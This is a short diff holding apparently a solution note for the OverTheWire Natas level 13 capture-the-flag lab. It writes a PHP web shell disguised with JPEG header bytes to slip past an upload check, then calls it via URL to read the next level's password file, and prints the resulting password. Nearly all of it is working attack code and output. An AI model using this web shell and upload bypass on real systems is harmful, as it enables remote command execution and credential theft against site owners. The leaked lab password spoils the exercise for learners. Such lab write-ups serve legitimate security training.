@@ -1,0 +1,7 @@
+>>> fh = open('shell.php', 'wb')
+>>> fh.write(b'\xFF\xD8\xFF\xE0' + b'<?php echo shell_exec($_GET['e'].' 2>&1'); ?>')
+>>> fh.close()
+
+http://natas13.natas.labs.overthewire.org/upload/genm9aq2z0.php?e=cat%20/etc/natas_webpass/natas14
+
+����qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP 
